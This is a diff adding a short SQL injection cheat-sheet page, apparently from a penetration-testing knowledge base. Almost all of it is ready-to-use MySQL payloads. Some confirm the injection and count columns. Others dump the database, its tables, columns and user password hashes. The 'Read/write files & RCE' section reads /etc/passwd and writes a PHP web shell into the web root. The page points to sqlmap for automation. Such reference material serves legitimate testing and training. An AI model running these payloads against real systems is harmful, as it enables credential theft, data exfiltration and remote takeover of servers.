@@ -1,0 +1,37 @@
+---
+title: "SQL Injection"
+---
+
+Injection into a SQL query. Confirm with a boolean/error probe, find the column count, then extract data.
+
+```sql
+-- confirm
+' OR '1'='1
+' AND 1=1-- -      -- true
+' AND 1=2-- -      -- false / different
+-- column count
+' ORDER BY 5-- -
+' UNION SELECT 1,2,3,4,5-- -
+```
+
+## UNION-based extraction (MySQL)
+
+```sql
+' UNION SELECT 1,database(),version(),4-- -
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,concat(user,':',password),3,4 FROM users-- -
+```
+
+## Read/write files & RCE (MySQL)
+
+```sql
+' UNION SELECT 1,load_file('/etc/passwd'),3,4-- -
+' UNION SELECT 1,'<?php system($_GET[0]);?>',3,4 INTO OUTFILE '/var/www/html/sh.php'-- -
+```
+
+<Warning>
+Requires `FILE` privilege and a known, writable web root. `secure_file_priv` must permit it.
+</Warning>
+
+See [SQLmap](/web/sqlmap) to automate detection and extraction.
